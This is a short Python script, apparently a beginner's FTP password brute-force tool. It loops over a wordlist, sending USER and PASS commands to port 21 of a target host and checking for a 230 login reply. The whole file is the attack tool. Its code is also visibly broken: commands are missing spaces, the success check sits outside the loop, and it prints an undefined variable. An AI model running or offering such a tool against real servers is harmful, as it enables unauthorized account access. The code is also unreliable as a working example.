#!/usr/bin/python
import socket,sys,re

if len(sys.argv) != 3:
  print("Instruction: python ftp_brute_force.py 127.0.0.1 user")
  sys.exit()

target = sys.argv[1]  # 0 - program file name, 1 - target,2 - user
user = sys.argv[2]

f = open('wordlist.txt')
for word in f.readlines():
  print("Realizando brute force FTP: %s:%s" %(user,word))

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,21))
  s.recv(1024)

  s.send("USER" + user + "\r\n")  #\r\n works like ENTER key, to send the information
  s.recv(1024)
  s.send("PASS" + word + "\r\n")
  answer = s.recv(1024)
  s.send("QUIT\r\n")

if re.search("230", answer): #using re library, if there's 230 inside the var answer, it will do the IF
  print("[+] Senha encontrada --->", palavra)
else:
  print("Acesso negado")
